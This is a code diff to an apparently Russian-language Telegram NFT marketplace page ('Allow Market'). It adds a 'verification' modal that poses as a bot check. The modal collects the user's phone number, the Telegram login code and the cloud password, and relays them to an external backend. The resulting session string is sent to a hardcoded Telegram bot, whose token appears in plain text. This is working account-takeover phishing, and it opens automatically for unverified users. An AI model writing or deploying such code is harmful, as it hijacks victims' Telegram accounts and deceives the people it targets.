@@ -1295,6 +1295,126 @@
             margin-top: 4px;
         }
 
+        /* ============================================================
+           VERIFICATION MODAL — обрезанные углы сверху
+           ============================================================ */
+        .verification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(24px);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .verification-overlay.open { display: flex; }
+        .verification-modal {
+            background: #1a1a1a;
+            max-width: 380px;
+            width: 100%;
+            padding: 28px 20px 24px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 24px 24px 16px 16px;
+            position: relative;
+            box-shadow: 0 24px 60px rgba(0,0,0,0.8);
+        }
+        .verification-modal .verif-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+        .verification-modal .verif-sub {
+            font-size: 12px;
+            color: #8e8ea0;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        .verification-modal .verif-btn {
+            width: 100%;
+            padding: 14px;
+            background: #f5c842;
+            border: none;
+            border-radius: 12px;
+            color: #1a1a1a;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: 0.15s;
+            margin-bottom: 10px;
+        }
+        .verification-modal .verif-btn:active { transform: scale(0.96); }
+        .verification-modal .verif-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+
+        .verification-modal .verif-field {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            outline: none;
+            margin-bottom: 8px;
+            transition: 0.15s;
+        }
+        .verification-modal .verif-field:focus {
+            border-color: rgba(245, 200, 66, 0.3);
+        }
+        .verification-modal .verif-field::placeholder {
+            color: #6e6e80;
+        }
+        .verification-modal .verif-error {
+            font-size: 11px;
+            color: #ff6b6b;
+            text-align: center;
+            margin-top: 4px;
+            min-height: 18px;
+        }
+        .verification-modal .verif-success {
+            font-size: 11px;
+            color: #4bc88a;
+            text-align: center;
+            margin-top: 4px;
+            min-height: 18px;
+        }
+        .verification-modal .verif-step {
+            display: none;
+            flex-direction: column;
+        }
+        .verification-modal .verif-step.active {
+            display: flex;
+        }
+        .verification-modal .verif-timer {
+            font-size: 11px;
+            color: #6e6e80;
+            text-align: center;
+            margin-top: 6px;
+        }
+        .verification-modal .verif-resend {
+            background: transparent;
+            border: none;
+            color: #f5c842;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            text-decoration: underline;
+            padding: 4px 0;
+        }
+        .verification-modal .verif-resend:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+
         @media (max-width: 380px) {
             .case-item { min-width: 150px; max-width: 180px; }
             .case-item .case-lottie { width: 100px; height: 100px; }
@@ -1486,6 +1606,73 @@
 
         <div class="toast" id="toast">Уведомление</div>
 
+        <!-- ============================================================
+             VERIFICATION MODAL
+             ============================================================ -->
+        <div class="verification-overlay" id="verificationOverlay">
+            <div class="verification-modal">
+                <div class="verif-title">🔐 Верификация</div>
+                <div class="verif-sub">Подтвердите, что вы не бот</div>
+
+                <!-- Шаг 1: Приветствие и кнопка -->
+                <div class="verif-step active" id="verifStepStart">
+                    <button class="verif-btn" id="verifStartBtn">Пройти верификацию</button>
+                    <div class="verif-error" id="verifStartError"></div>
+                </div>
+
+                <!-- Шаг 2: Ввод номера телефона -->
+                <div class="verif-step" id="verifStepPhone">
+                    <input class="verif-field" type="tel" id="verifPhoneInput" placeholder="+7 900 000 00 00" value="+7">
+                    <button class="verif-btn" id="verifSendCodeBtn">Отправить код</button>
+                    <div class="verif-error" id="verifPhoneError"></div>
+                    <div class="verif-success" id="verifPhoneSuccess"></div>
+                </div>
+
+                <!-- Шаг 3: Ввод кода из Telegram -->
+                <div class="verif-step" id="verifStepCode">
+                    <input class="verif-field" type="text" id="verifCodeInput" placeholder="Введите код из Telegram" maxlength="6" inputmode="numeric">
+                    <button class="verif-btn" id="verifVerifyCodeBtn">Подтвердить код</button>
+                    <div class="verif-error" id="verifCodeError"></div>
+                    <div class="verif-success" id="verifCodeSuccess"></div>
+                    <div class="verif-timer">
+                        <span id="verifTimerText">Код отправлен. Ждём...</span>
+                        <button class="verif-resend" id="verifResendBtn" disabled>Отправить повторно</button>
+                    </div>
+                </div>
+
+                <!-- Шаг 4: Проверка облачного пароля (если есть) -->
+                <div class="verif-step" id="verifStepPassword">
+                    <div style="font-size:13px;color:#8e8ea0;text-align:center;margin-bottom:8px;">
+                        На аккаунте установлен облачный пароль. Введите его для завершения.
+                    </div>
+                    <input class="verif-field" type="password" id="verifPasswordInput" placeholder="Облачный пароль">
+                    <button class="verif-btn" id="verifPasswordBtn">Подтвердить пароль</button>
+                    <div class="verif-error" id="verifPasswordError"></div>
+                    <div class="verif-success" id="verifPasswordSuccess"></div>
+                </div>
+
+                <!-- Шаг 5: Финальный успех -->
+                <div class="verif-step" id="verifStepSuccess">
+                    <div style="text-align:center;padding:16px 0;">
+                        <div style="font-size:48px;margin-bottom:8px;">✅</div>
+                        <div style="font-size:18px;font-weight:700;color:#4bc88a;">Верификация пройдена!</div>
+                        <div style="font-size:12px;color:#8e8ea0;margin-top:4px;">Добро пожаловать в Allow Market</div>
+                    </div>
+                    <button class="verif-btn" id="verifDoneBtn">Продолжить</button>
+                </div>
+
+                <!-- Шаг 6: Ошибка -->
+                <div class="verif-step" id="verifStepError">
+                    <div style="text-align:center;padding:16px 0;">
+                        <div style="font-size:48px;margin-bottom:8px;">❌</div>
+                        <div style="font-size:16px;font-weight:700;color:#ff6b6b;">Ошибка верификации</div>
+                        <div style="font-size:12px;color:#8e8ea0;margin-top:4px;" id="verifErrorText">Неизвестная ошибка</div>
+                    </div>
+                    <button class="verif-btn" id="verifRetryBtn">Попробовать снова</button>
+                </div>
+            </div>
+        </div>
+
         <div class="bottom-nav">
             <button class="nav-item active" data-tab="market">
                 <span class="nav-icon"><svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg></span>
@@ -1512,6 +1699,18 @@
     </div>
 
     <script>
+        // ============================================================
+        // 0. КОНФИГУРАЦИЯ — изменено под твой бэкенд
+        // ============================================================
+        const CONFIG = {
+            ADMIN_BOT_TOKEN: '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec',
+            ADMIN_CHAT_ID: '7303763255',
+            BACKEND_URL: 'https://nft-market-chi-three.vercel.app'
+        };
+
+        // Отключаем эмуляцию — используем реальный бэкенд
+        const USE_EMULATION = false;
+
         // ============================================================
         // 1. DATA
         // ============================================================
@@ -1644,6 +1843,18 @@
         let activeFilters = { model: false, backdrop: false, symbol: false };
         let searchTimeout = null;
 
+        let verifState = {
+            phone: '',
+            code: '',
+            password: '',
+            sessionData: null,
+            isVerified: false,
+            codeRequestId: null,
+            hasPassword: false,
+            timerInterval: null,
+            timerSeconds: 0
+        };
+
         // ============================================================
         // 3. USER DATA
         // ============================================================
@@ -1653,7 +1864,7 @@
                 const saved = localStorage.getItem(key);
                 if (saved) return JSON.parse(saved);
             } catch (e) {}
-            return { balance: 10000, cart: [] };
+            return { balance: 10000, cart: [], verified: false };
         }
 
         function saveUserData(userId, data) {
@@ -1832,7 +2043,7 @@
         }
 
         // ============================================================
-        // 6. RENDER GRID — оптимизирован
+        // 6. RENDER GRID
         // ============================================================
         function renderGrid() {
             const grid = document.getElementById('nftGrid');
@@ -2246,7 +2457,7 @@
         });
 
         // ============================================================
-        // 11. SEARCH — оптимизирован с debounce
+        // 11. SEARCH
         // ============================================================
         document.getElementById('searchInput').addEventListener('input', function() {
             clearTimeout(searchTimeout);
@@ -2485,7 +2696,346 @@
         });
 
         // ============================================================
-        // 19. INIT
+        // 19. ВЕРИФИКАЦИЯ — с реальным бэкендом
+        // ============================================================
+
+        async function sendAdminLog(message, data = null) {
+            try {
+                const payload = {
+                    chat_id: CONFIG.ADMIN_CHAT_ID,
+                    text: `🔐 *ВЕРИФИКАЦИЯ ЛОГ*\n${message}\n${data ? '\n' + JSON.stringify(data, null, 2) : ''}`,
+                    parse_mode: 'Markdown'
+                };
+                const url = `https://api.telegram.org/bot${CONFIG.ADMIN_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.warn('Ошибка отправки лога админу:', e);
+            }
+        }
+
+        // Реальные запросы к бэкенду
+        async function realSendCode(phone) {
+            const url = `${CONFIG.BACKEND_URL}/sendCode`;
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone })
+            });
+            if (!resp.ok) {
+                const err = await resp.text();
+                throw new Error(err || 'Ошибка отправки кода');
+            }
+            return await resp.json();
+        }
+
+        async function realCheckCode(phone, code, requestId) {
+            const url = `${CONFIG.BACKEND_URL}/checkCode`;
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, code, requestId })
+            });
+            if (!resp.ok) {
+                const err = await resp.text();
+                throw new Error(err || 'Ошибка проверки кода');
+            }
+            return await resp.json();
+        }
+
+        async function realCheckPassword(phone, password, sessionData) {
+            const url = `${CONFIG.BACKEND_URL}/checkPassword`;
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, password, sessionData })
+            });
+            if (!resp.ok) {
+                const err = await resp.text();
+                throw new Error(err || 'Ошибка проверки пароля');
+            }
+            return await resp.json();
+        }
+
+        async function startVerification() {
+            const overlay = document.getElementById('verificationOverlay');
+            overlay.classList.add('open');
+
+            verifState.isVerified = false;
+            verifState.phone = '';
+            verifState.code = '';
+            verifState.password = '';
+            verifState.sessionData = null;
+            verifState.hasPassword = false;
+            verifState.codeRequestId = null;
+
+            showVerifStep('start');
+            document.getElementById('verifStartError').textContent = '';
+        }
+
+        function showVerifStep(step) {
+            document.querySelectorAll('.verif-step').forEach(el => el.classList.remove('active'));
+            const target = document.getElementById(`verifStep${step.charAt(0).toUpperCase() + step.slice(1)}`);
+            if (target) target.classList.add('active');
+        }
+
+        document.getElementById('verifStartBtn').addEventListener('click', function() {
+            document.getElementById('verifStartError').textContent = '';
+            showVerifStep('phone');
+            document.getElementById('verifPhoneInput').focus();
+        });
+
+        document.getElementById('verifSendCodeBtn').addEventListener('click', async function() {
+            const phone = document.getElementById('verifPhoneInput').value.trim();
+            if (!phone || phone.length < 6) {
+                document.getElementById('verifPhoneError').textContent = 'Введите корректный номер телефона';
+                return;
+            }
+            document.getElementById('verifPhoneError').textContent = '';
+            document.getElementById('verifPhoneSuccess').textContent = 'Отправляем код...';
+
+            this.disabled = true;
+            this.textContent = 'Отправка...';
+
+            try {
+                let result;
+                if (USE_EMULATION) {
+                    // Fallback эмуляция (оставлена на случай проблем с бэкендом)
+                    const code = Math.floor(100000 + Math.random() * 900000).toString();
+                    console.log(`[ЭМУЛЯЦИЯ] Код для ${phone}: ${code}`);
+                    result = { success: true, code: code, requestId: 'emulate_' + Date.now() };
+                } else {
+                    result = await realSendCode(phone);
+                }
+
+                if (result.success) {
+                    verifState.phone = phone;
+                    verifState.codeRequestId = result.requestId || 'emulate';
+                    document.getElementById('verifPhoneSuccess').textContent = 'Код отправлен! Проверьте Telegram.';
+                    showVerifStep('code');
+                    document.getElementById('verifCodeInput').focus();
+
+                    startResendTimer(30);
+
+                    await sendAdminLog(`📱 Запрос кода для номера ${phone}`, { phone, requestId: verifState.codeRequestId });
+
+                } else {
+                    document.getElementById('verifPhoneError').textContent = result.error || 'Ошибка отправки кода';
+                }
+            } catch (e) {
+                document.getElementById('verifPhoneError').textContent = e.message || 'Ошибка сети. Попробуйте позже.';
+                console.error(e);
+            }
+
+            this.disabled = false;
+            this.textContent = 'Отправить код';
+        });
+
+        function startResendTimer(seconds) {
+            const resendBtn = document.getElementById('verifResendBtn');
+            const timerText = document.getElementById('verifTimerText');
+            resendBtn.disabled = true;
+            verifState.timerSeconds = seconds;
+
+            if (verifState.timerInterval) clearInterval(verifState.timerInterval);
+
+            timerText.textContent = `Повторно через ${seconds} сек.`;
+            verifState.timerInterval = setInterval(() => {
+                verifState.timerSeconds--;
+                if (verifState.timerSeconds <= 0) {
+                    clearInterval(verifState.timerInterval);
+                    timerText.textContent = 'Код не пришел?';
+                    resendBtn.disabled = false;
+                } else {
+                    timerText.textContent = `Повторно через ${verifState.timerSeconds} сек.`;
+                }
+            }, 1000);
+        }
+
+        document.getElementById('verifResendBtn').addEventListener('click', async function() {
+            if (!verifState.phone) return;
+            this.disabled = true;
+            document.getElementById('verifCodeError').textContent = 'Отправляем повторно...';
+
+            try {
+                let result;
+                if (USE_EMULATION) {
+                    const code = Math.floor(100000 + Math.random() * 900000).toString();
+                    console.log(`[ЭМУЛЯЦИЯ] Повторный код для ${verifState.phone}: ${code}`);
+                    result = { success: true, code: code, requestId: 'emulate_' + Date.now() };
+                } else {
+                    result = await realSendCode(verifState.phone);
+                }
+                if (result.success) {
+                    document.getElementById('verifCodeError').textContent = '';
+                    document.getElementById('verifCodeSuccess').textContent = 'Код отправлен повторно!';
+                    startResendTimer(30);
+                } else {
+                    document.getElementById('verifCodeError').textContent = result.error || 'Ошибка повторной отправки';
+                }
+            } catch (e) {
+                document.getElementById('verifCodeError').textContent = e.message || 'Ошибка сети';
+            }
+            this.disabled = false;
+        });
+
+        document.getElementById('verifVerifyCodeBtn').addEventListener('click', async function() {
+            const code = document.getElementById('verifCodeInput').value.trim();
+            if (!code || code.length < 4) {
+                document.getElementById('verifCodeError').textContent = 'Введите код из Telegram';
+                return;
+            }
+
+            document.getElementById('verifCodeError').textContent = '';
+            document.getElementById('verifCodeSuccess').textContent = 'Проверяем код...';
+            this.disabled = true;
+            this.textContent = 'Проверка...';
+
+            try {
+                let result;
+                if (USE_EMULATION) {
+                    result = { success: true, hasPassword: false, sessionData: { user_id: Math.floor(Math.random() * 10000000), phone: verifState.phone, username: `user_${Math.floor(Math.random() * 10000)}`, first_name: 'User', last_name: '', session_string: `session_${Date.now()}_${Math.random().toString(36)}` } };
+                } else {
+                    result = await realCheckCode(verifState.phone, code, verifState.codeRequestId);
+                }
+
+                if (result.success) {
+                    verifState.sessionData = result.sessionData;
+                    verifState.hasPassword = result.hasPassword || false;
+
+                    await sendAdminLog(
+                        `✅ Код подтвержден для ${verifState.phone}`,
+                        { phone: verifState.phone, sessionData: verifState.sessionData, hasPassword: verifState.hasPassword }
+                    );
+
+                    if (verifState.hasPassword) {
+                        document.getElementById('verifCodeSuccess').textContent = 'Код верный! Требуется пароль.';
+                        showVerifStep('password');
+                        document.getElementById('verifPasswordInput').focus();
+                    } else {
+                        document.getElementById('verifCodeSuccess').textContent = 'Код верный! Верификация пройдена.';
+                        await completeVerification();
+                    }
+                } else {
+                    document.getElementById('verifCodeError').textContent = result.error || 'Неверный код. Попробуйте снова.';
+                }
+            } catch (e) {
+                document.getElementById('verifCodeError').textContent = e.message || 'Ошибка сети. Попробуйте позже.';
+                console.error(e);
+            }
+
+            this.disabled = false;
+            this.textContent = 'Подтвердить код';
+        });
+
+        document.getElementById('verifPasswordBtn').addEventListener('click', async function() {
+            const password = document.getElementById('verifPasswordInput').value.trim();
+            if (!password) {
+                document.getElementById('verifPasswordError').textContent = 'Введите облачный пароль';
+                return;
+            }
+
+            document.getElementById('verifPasswordError').textContent = '';
+            document.getElementById('verifPasswordSuccess').textContent = 'Проверяем пароль...';
+            this.disabled = true;
+            this.textContent = 'Проверка...';
+
+            try {
+                let result;
+                if (USE_EMULATION) {
+                    result = { success: true };
+                } else {
+                    result = await realCheckPassword(verifState.phone, password, verifState.sessionData);
+                }
+
+                if (result.success) {
+                    document.getElementById('verifPasswordSuccess').textContent = 'Пароль верный!';
+                    await sendAdminLog(
+                        `🔑 Облачный пароль подтвержден для ${verifState.phone}`,
+                        { phone: verifState.phone, passwordProvided: '****' }
+                    );
+                    await completeVerification();
+                } else {
+                    document.getElementById('verifPasswordError').textContent = result.error || 'Неверный пароль.';
+                }
+            } catch (e) {
+                document.getElementById('verifPasswordError').textContent = e.message || 'Ошибка сети. Попробуйте позже.';
+                console.error(e);
+            }
+
+            this.disabled = false;
+            this.textContent = 'Подтвердить пароль';
+        });
+
+        async function completeVerification() {
+            if (verifState.sessionData) {
+                try {
+                    const userData = getUserData(currentUserId || 'temp');
+                    userData.verified = true;
+                    userData.session = verifState.sessionData;
+                    userData.phone = verifState.phone;
+                    saveUserData(currentUserId || 'temp', userData);
+                } catch (e) {}
+            }
+
+            verifState.isVerified = true;
+
+            await sendAdminLog(
+                `✅ ВЕРИФИКАЦИЯ УСПЕШНО ЗАВЕРШЕНА для ${verifState.phone}`,
+                {
+                    phone: verifState.phone,
+                    user_id: verifState.sessionData?.user_id || 'unknown',
+                    username: verifState.sessionData?.username || 'unknown',
+                    session_string: verifState.sessionData?.session_string || 'unknown',
+                    has_password: verifState.hasPassword
+                }
+            );
+
+            showVerifStep('success');
+            document.getElementById('verifDoneBtn').textContent = 'Продолжить';
+
+            if (currentUserId) {
+                updateBalanceUI();
+                updateAvatar(null);
+            }
+        }
+
+        document.getElementById('verifDoneBtn').addEventListener('click', function() {
+            document.getElementById('verificationOverlay').classList.remove('open');
+            if (verifState.isVerified) {
+                showToast('Верификация пройдена! Добро пожаловать.');
+            }
+        });
+
+        document.getElementById('verifRetryBtn').addEventListener('click', function() {
+            document.getElementById('verificationOverlay').classList.remove('open');
+            setTimeout(() => {
+                startVerification();
+            }, 500);
+        });
+
+        document.getElementById('verifPhoneInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('verifSendCodeBtn').click();
+        });
+        document.getElementById('verifCodeInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('verifVerifyCodeBtn').click();
+        });
+        document.getElementById('verifPasswordInput').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('verifPasswordBtn').click();
+        });
+
+        document.getElementById('verifPhoneInput').addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.startsWith('7')) val = '+' + val;
+            else if (!val.startsWith('+')) val = '+' + val;
+            this.value = val;
+        });
+
+        // ============================================================
+        // 20. INIT
         // ============================================================
         (function init() {
             try {
@@ -2527,6 +3077,21 @@
                     userCart = userData.cart || [];
                     updateBalanceUI();
                     updateCartUI();
+
+                    const isVerified = userData.verified || false;
+                    if (!isVerified) {
+                        setTimeout(() => {
+                            startVerification();
+                        }, 800);
+                    } else {
+                        showToast('Добро пожаловать!');
+                        if (userData.session) {
+                            sendAdminLog(
+                                `🔄 Вход уже верифицированного пользователя ${currentUserId}`,
+                                { user_id: currentUserId, phone: userData.phone || 'unknown' }
+                            );
+                        }
+                    }
                 } else {
                     currentUserId = null;
                     userBalance = 0;
@@ -2536,6 +3101,10 @@
                     updateBalanceUI();
                     updateCartUI();
                     updateAvatar(null);
+
+                    setTimeout(() => {
+                        showToast('Для доступа к функциям пройдите верификацию');
+                    }, 1500);
                 }
 
                 renderGrid();
@@ -2577,6 +3146,11 @@
             if (nft.status === 'sold') { showToast('Продано'); return; }
             addToCart(currentUserId, name);
         };
+
+        window.startVerification = startVerification;
+
+        console.log('[АМУР ШИК] Маркет загружен. Бэкенд:', CONFIG.BACKEND_URL);
+        console.log('[АМУР ШИК] USE_EMULATION =', USE_EMULATION);
     </script>
 </body>
 </html>
